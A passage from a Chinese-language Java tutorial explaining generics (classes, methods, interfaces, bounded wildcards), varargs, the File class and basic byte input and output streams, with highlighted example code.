<p>此时，变量E的值就是Integer类型,那么我们的类型就可以理解为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123; </span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(Integer e)</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;  &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="举例自定义泛型类"><a href="#举例自定义泛型类" class="headerlink" title="举例自定义泛型类"></a>举例自定义泛型类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGenericClass</span>&lt;<span class="title">MVP</span>&gt; </span>&#123;</span><br><span class="line">	<span class="comment">//没有MVP类型，在这里代表 未知的一种数据类型 未来传递什么就是什么类型</span></span><br><span class="line">	<span class="keyword">private</span> MVP mvp;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMVP</span><span class="params">(MVP mvp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.mvp = mvp;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> MVP <span class="title">getMVP</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mvp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericClassDemo</span> </span>&#123;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;		 </span><br><span class="line">         <span class="comment">// 创建一个泛型为String的类</span></span><br><span class="line">         MyGenericClass&lt;String&gt; my = <span class="keyword">new</span> MyGenericClass&lt;String&gt;();    	</span><br><span class="line">         <span class="comment">// 调用setMVP</span></span><br><span class="line">         my.setMVP(<span class="string">"大胡子登登"</span>);</span><br><span class="line">         <span class="comment">// 调用getMVP</span></span><br><span class="line">         String mvp = my.getMVP();</span><br><span class="line">         System.out.println(mvp);</span><br><span class="line">         <span class="comment">//创建一个泛型为Integer的类</span></span><br><span class="line">         MyGenericClass&lt;Integer&gt; my2 = <span class="keyword">new</span> MyGenericClass&lt;Integer&gt;(); </span><br><span class="line">         my2.setMVP(<span class="number">123</span>);   	  </span><br><span class="line">         Integer mvp2 = my2.getMVP();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="含有泛型的方法"><a href="#含有泛型的方法" class="headerlink" title="含有泛型的方法"></a>含有泛型的方法</h2><p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGenericMethod</span> </span>&#123;	  </span><br><span class="line">    <span class="keyword">public</span> &lt;MVP&gt; <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(MVP mvp)</span> </span>&#123;</span><br><span class="line">    	System.out.println(mvp.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> &lt;MVP&gt; <span class="function">MVP <span class="title">show2</span><span class="params">(MVP mvp)</span> </span>&#123;	</span><br><span class="line">    	<span class="keyword">return</span> mvp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用格式：<strong>调用方法时，确定泛型的类型</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericMethodDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        MyGenericMethod mm = <span class="keyword">new</span> MyGenericMethod();</span><br><span class="line">        <span class="comment">// 演示看方法提示</span></span><br><span class="line">        mm.show(<span class="string">"aaa"</span>);</span><br><span class="line">        mm.show(<span class="number">123</span>);</span><br><span class="line">        mm.show(<span class="number">12.45</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="含有泛型的接口"><a href="#含有泛型的接口" class="headerlink" title="含有泛型的接口"></a>含有泛型的接口</h2><p>定义格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修饰符 interface接口名&lt;代表泛型的变量&gt; &#123;  &#125;</span><br></pre></td></tr></table></figure>

<p>例如:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyGenericInterface</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> E <span class="title">getE</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用格式：</p>
<p><strong>1、定义类时确定泛型的类型</strong></p>
<p>例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyImp1</span> <span class="keyword">implements</span> <span class="title">MyGenericInterface</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(String e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 省略...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，泛型E的值就是String类型。</p>
<p> <strong>2、始终不确定泛型的类型，直到创建对象时，确定泛型的类型</strong></p>
<p> 例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyImp2</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">MyGenericInterface</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">       	 <span class="comment">// 省略...</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> E <span class="title">getE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>确定泛型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 使用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyImp2&lt;String&gt;  my = <span class="keyword">new</span> MyImp2&lt;String&gt;();  </span><br><span class="line">        my.add(<span class="string">"aa"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>当使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示。但是一旦使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。</p>
<h4 id="通配符基本使用"><a href="#通配符基本使用" class="headerlink" title="通配符基本使用"></a>通配符基本使用</h4><p>泛型的通配符:<strong>不知道使用什么类型来接收的时候,此时可以使用<?,?>表示未知通配符。</strong></p>
<p>此时只能接受数据,不能往该集合中存储数据。</p>
<p>举个例子大家理解使用即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Collection&lt;Integer&gt; list1 = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    getElement(list1);</span><br><span class="line">    Collection&lt;String&gt; list2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    getElement(list2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getElement</span><span class="params">(Collection&lt;?&gt; coll)</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">//？代表可以接收任意类型</span></span><br></pre></td></tr></table></figure>

<h3 id="通配符高级使用—-受限泛型"><a href="#通配符高级使用—-受限泛型" class="headerlink" title="通配符高级使用—-受限泛型"></a>通配符高级使用—-受限泛型</h3><p>之前设置泛型的时候，实际上是可以任意设置的，只要是类就可以设置。但是在JAVA的泛型中可以指定一个泛型的<strong>上限</strong>和<strong>下限</strong>。</p>
<p><strong>泛型的上限</strong>：</p>
<ul>
<li><strong>格式</strong>： <code>类型名称 &lt;? extends 类 &gt; 对象名称</code></li>
<li><strong>意义</strong>： <code>只能接收该类型及其子类</code></li>
</ul>
<p><strong>泛型的下限</strong>：</p>
<ul>
<li><strong>格式</strong>： <code>类型名称 &lt;? super 类 &gt; 对象名称</code></li>
<li><strong>意义</strong>： <code>只能接收该类型及其父类型</code></li>
</ul>
<p>比如：现已知Object类，String 类，Number类，Integer类，其中Number是Integer的父类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Collection&lt;Integer&gt; list1 = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    Collection&lt;String&gt; list2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    Collection&lt;Number&gt; list3 = <span class="keyword">new</span> ArrayList&lt;Number&gt;();</span><br><span class="line">    Collection&lt;Object&gt; list4 = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">    </span><br><span class="line">    getElement(list1);</span><br><span class="line">    getElement(list2);<span class="comment">//报错</span></span><br><span class="line">    getElement(list3);</span><br><span class="line">    getElement(list4);<span class="comment">//报错</span></span><br><span class="line">  </span><br><span class="line">    getElement2(list1);<span class="comment">//报错</span></span><br><span class="line">    getElement2(list2);<span class="comment">//报错</span></span><br><span class="line">    getElement2(list3);</span><br><span class="line">    getElement2(list4);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getElement1</span><span class="params">(Collection&lt;? extends Number&gt; coll)</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">// 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getElement2</span><span class="params">(Collection&lt;? <span class="keyword">super</span> Number&gt; coll)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><p>在JDK1.5之后，如果我们定义一个方法需要接受多个参数，并且多个参数类型一致，我们可以对其简化成如下格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型... 形参名)&#123; &#125;</span><br></pre></td></tr></table></figure>

<p>其实这个书写完全等价与</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型[] 形参名)&#123; &#125;</span><br></pre></td></tr></table></figure>

<p>只是后面这种定义，在调用时必须传递数组，而前者可以直接传递数据即可。 </p>
<p>JDK1.5以后。出现了简化操作。</p>
<p>… 用在参数上，称之为可变参数。</p>
<p>同样是代表数组，但是在调用这个带有可变参数的方法时，不用创建数组(这就是简单之处)，直接将数组中的元素，作为实际参数进行传递，其实编译成的class文件，将这些元素先封装到一个数组中，再进行传递。这些动作都在编译.class文件时自动完成的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChangeArgs</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] arr = &#123; <span class="number">1</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">431</span>, <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> sum = getSum(arr);</span><br><span class="line">System.out.println(sum);</span><br><span class="line"><span class="comment">// 6 7 2 12 2121</span></span><br><span class="line"><span class="comment">// 求 这几个元素和 6 7 2 12 2121</span></span><br><span class="line"><span class="keyword">int</span> sum2 = getSum(<span class="number">6</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">2121</span>);</span><br><span class="line">System.out.println(sum2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 完成数组 所有元素的求和 原始写法</span></span><br><span class="line"><span class="comment">public static int getSum(int[] arr)&#123;</span></span><br><span class="line"><span class="comment">int sum = 0;</span></span><br><span class="line"><span class="comment">for(int a : arr)&#123;</span></span><br><span class="line"><span class="comment">sum += a;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">return sum;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//可变参数写法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span>... arr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> a : arr) &#123;</span><br><span class="line">sum += a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="File类"><a href="#File类" class="headerlink" title="File类"></a>File类</h1><p><code>java.io.File</code> 类是文件和目录路径名的抽象表示，主要用于文件和目录的创建、查找和删除等操作。</p>
<h2 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h2><p><code>public File(String pathname)</code> ：通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例。</p>
<p><code>public File(String parent, String child)</code>：从父路径名字符串和子路径名字符串创建新的 File实例。</p>
<p><code>public File(File parent, String child)</code>：从父抽象路径名和子路径名字符串创建新的 File实例。 </p>
<p>构造举例，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件路径名</span></span><br><span class="line">String pathname = <span class="string">"D:\\aaa.txt"</span>;</span><br><span class="line">File file1 = <span class="keyword">new</span> File(pathname);</span><br><span class="line"><span class="comment">// 文件路径名</span></span><br><span class="line">String pathname2 = <span class="string">"D:\\aaa\\bbb.txt"</span>;</span><br><span class="line">File file2 = <span class="keyword">new</span> File(pathname2);</span><br><span class="line"><span class="comment">// 通过父路径和子路径字符串</span></span><br><span class="line">String parent = <span class="string">"d:\\aaa"</span>;</span><br><span class="line">String child = <span class="string">"bbb.txt"</span>;</span><br><span class="line">File file3 = <span class="keyword">new</span> File(parent, child);</span><br><span class="line"><span class="comment">// 通过父级File对象和子路径字符串</span></span><br><span class="line">File parentDir = <span class="keyword">new</span> File(<span class="string">"d:\\aaa"</span>);</span><br><span class="line">String child = <span class="string">"bbb.txt"</span>;</span><br><span class="line">File file4 = <span class="keyword">new</span> File(parentDir, child);</span><br></pre></td></tr></table></figure>

<h2 id="获取功能的方法-1"><a href="#获取功能的方法-1" class="headerlink" title="获取功能的方法"></a>获取功能的方法</h2><p><code>public String getAbsolutePath()</code> ：返回此File的绝对路径名字符串。 </p>
<p><code>public String getPath()</code>：将此File转换为路径名字符串。 </p>
<p><code>public String getName()</code>：返回由此File表示的文件或目录的名称。 </p>
<p><code>public long length()</code> ：返回由此File表示的文件的长度。</p>
<h2 id="判断功能的方法"><a href="#判断功能的方法" class="headerlink" title="判断功能的方法"></a>判断功能的方法</h2><p><code>public boolean exists()</code> ：此File表示的文件或目录是否实际存在。 </p>
<p><code>public boolean isDirectory()</code> ：此File表示的是否为目录。 </p>
<p><code>public boolean isFile()</code> ：此File表示的是否为文件。</p>
<h2 id="创建删除的方法"><a href="#创建删除的方法" class="headerlink" title="创建删除的方法"></a>创建删除的方法</h2><p><code>public boolean createNewFile()</code>：当且仅当具有该名称的文件尚不存在时，创建一个新的空文件。 </p>
<p><code>public boolean delete()</code> ：删除由此File表示的文件或目录。</p>
<p><code>public boolean mkdir()</code>：创建由此File表示的目录。</p>
<p><code>public boolean mkdirs()</code> ：创建由此File表示的目录，包括任何必需但不存在的父目录。</p>
<h2 id="目录遍历的方法"><a href="#目录遍历的方法" class="headerlink" title="目录遍历的方法"></a>目录遍历的方法</h2><p><code>public String[] list()</code> ：返回一个String数组，表示该File目录中的所有子文件或目录。 </p>
<p><code>public File[] listFiles()</code> ：返回一个File数组，表示该File目录中的所有的子文件或目录。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileFor</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">File dir = <span class="keyword">new</span> File(<span class="string">"d:\\java_code"</span>);</span><br><span class="line"><span class="comment">//获取当前目录下的文件以及文件夹的名称。</span></span><br><span class="line">String[] names = dir.list();</span><br><span class="line"><span class="keyword">for</span>(String name : names)&#123;</span><br><span class="line">System.out.println(name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取当前目录下的文件以及文件夹对象，只要拿到了文件对象，那么就可以获取更多信息</span></span><br><span class="line">File[] files = dir.listFiles();</span><br><span class="line"><span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">System.out.println(file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="I-O-流"><a href="#I-O-流" class="headerlink" title="I/O 流"></a>I/O 流</h1><p>一切视角以内存为主。</p>
<p>根据数据的流向分为：输入流和输出流。 </p>
<ul>
<li>输入流 ：把数据从 其他设备 上读取到 内存 中的流。 </li>
<li>输出流 ：把数据从 内存 中写出到 其他设备 上的流。 </li>
</ul>
<p>格局数据的类型分为：字节流和字符流。 </p>
<ul>
<li>字节流 ：以字节为单位，读写数据的流。 </li>
<li>字符流 ：以字符为单位，读写数据的流。</li>
</ul>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429203709515.png" alt="image-20200429203709515"></p>
<h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><p>一切文件数据(文本、图片、视频等)在存储时，都是以二进制数字的形式保存，都一个一个的字节，那么传输时一 样如此。所以，字节流可以传输任意文件数据。在操作流的时候，我们要时刻明确：</p>
<p>无论使用什么样的流对象，底层传输的始终为二进制数据。</p>
<h3 id="OutputStream-字节输出流"><a href="#OutputStream-字节输出流" class="headerlink" title="OutputStream 字节输出流"></a>OutputStream 字节输出流</h3><p>java.io.OutputStream 是表示字节输出流的所有类的超类，将指定的字节信息写出到目的地。它定义了字节输出流的基本共性功能方法。 </p>
<p><code>public void close()</code>：关闭此输出流并释放与此流相关联的任何系统资源。 </p>
<p><code>public void flush()</code>：刷新此输出流并强制任何缓冲的输出字节被写出。 </p>
<p><code>public void write(byte[] b)</code> ：将 b.length字节从指定的字节数组写入此输出流。 </p>
<p><code>public void write(byte[] b, int off, int len)</code>：从指定的字节数组写入 len字节，从偏移量 off开始输出到此输出流。 </p>
<p><code>public abstract void write(int b)</code>：将指定的字节输出流。 </p>
<p>小贴士： close方法，当完成流的操作时，必须调用此方法，释放系统资源。</p>
<h4 id="FileOutputStream类"><a href="#FileOutputStream类" class="headerlink" title="FileOutputStream类"></a>FileOutputStream类</h4><p>OutputStream 有很多子类，我们从最简单的一个子类开始。 </p>
<p>java.io.FileOutputStream 类是文件输出流，用于将数据写出到文件里面。</p>
<p>构造方法：</p>
<p><code>public FileOutputStream(File file)</code> ：创建文件输出流以写入由指定的 File对象表示的文件。 </p>
<p><code>public FileOutputStream(String name)</code>： 创建文件输出流以指定的名称写入文件。</p>
<p>当你创建一个流对象时，必须传入一个文件路径。该路径下，如果没有这个文件，会创建该文件。如果有这个文件，会清空这个文件的数据。</p>
<p>Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileOutputStreamConstructor</span> <span class="title">throws</span> <span class="title">IOException</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 使用File对象创建流对象</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"a.txt"</span>);</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"b.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写出字节：</p>
<p><code>write(int b)</code> 方法，每次可以写出一个字节数据，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"fos.txt"</span>);</span><br><span class="line"><span class="comment">// 写出数据</span></span><br><span class="line">fos.write(<span class="number">97</span>); <span class="comment">// 写出第1个字节</span></span><br><span class="line">fos.write(<span class="number">98</span>); <span class="comment">// 写出第2个字节</span></span><br><span class="line">fos.write(<span class="number">99</span>); <span class="comment">// 写出第3个字节</span></span><br><span class="line"><span class="comment">// 关闭资源，一定记得</span></span><br><span class="line">fos.close();</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>

<p>写出字节数组：</p>
<p><code>write(byte[] b)</code> 每次可以写出数组中的数据，代码使用演示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class FOSWrite &#123;</span><br><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">// 使用文件名称创建流对象</span><br><span class="line">FileOutputStream fos = new FileOutputStream(&quot;fos.txt&quot;);</span><br><span class="line">// 字符串转换为字节数组</span><br><span class="line">byte[] b = &quot;程序员&quot;.getBytes();</span><br><span class="line">// 写出字节数组数据</span><br><span class="line">fos.write(b);</span><br><span class="line">// 关闭资源</span><br><span class="line">fos.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">程序员</span><br></pre></td></tr></table></figure>

<p>写出指定长度字节数组： </p>
<p><code>write(byte[] b, int off, int len)</code>,每次写出从off索引开始，len个字节，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FOSWrite</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"fos.txt"</span>);</span><br><span class="line"><span class="comment">// 字符串转换为字节数组</span></span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="string">"abcde"</span>.getBytes();</span><br><span class="line"><span class="comment">// 写出从索引2开始，2个字节。索引2是c，两个字节，也就是cd。</span></span><br><span class="line">fos.write(b,<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fos.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">cd</span><br></pre></td></tr></table></figure>

<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429205536626.png" alt="image-20200429205536626"></p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429205618717.png" alt="image-20200429205618717"></p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429205702501.png" alt="image-20200429205702501"></p>
<h3 id="InputStream-字节输入流"><a href="#InputStream-字节输入流" class="headerlink" title="InputStream 字节输入流"></a>InputStream 字节输入流</h3><p>java.io.InputStream 抽象类是表示字节输入流的所有类的超类，可以读取字节信息到内存中。</p>
<p>它定义了字节输入流的基本共性功能方法。</p>
<p><code>public void close()</code>：关闭此输入流并释放与此流相关联的任何系统资源。 <code>public abstract int read()</code> ： 从输入流读取数据的下一个字节。 </p>
<p><code>public int read(byte[] b)</code> ： 从输入流中读取一些字节数，并将它们存储到字节数组 b中 。</p>
<h4 id="FileInputStream类"><a href="#FileInputStream类" class="headerlink" title="FileInputStream类"></a>FileInputStream类</h4><p>java.io.FileInputStream 类是文件输入流，从文件中读取字节。</p>
<p>构造方法：</p>
<p><code>FileInputStream(File file)</code> ： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的 File对象 file命名。 </p>
<p><code>FileInputStream(String name)</code> ： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的路径名 name命名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileInputStreamConstructor</span> <span class="title">throws</span> <span class="title">IOException</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 使用File对象创建流对象</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"a.txt"</span>);</span><br><span class="line">FileInputStream fos = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileInputStream fos = <span class="keyword">new</span> FileInputStream(<span class="string">"b.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取字节：</p>
<p><code>read</code> 方法，【每次】可以读取一个字节的数据，提升为int类型，读取到文件末尾，返回 -1 ，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FISRead</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"read.txt"</span>);</span><br><span class="line"><span class="comment">// 读取数据，返回一个字节</span></span><br><span class="line"><span class="keyword">int</span> read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span 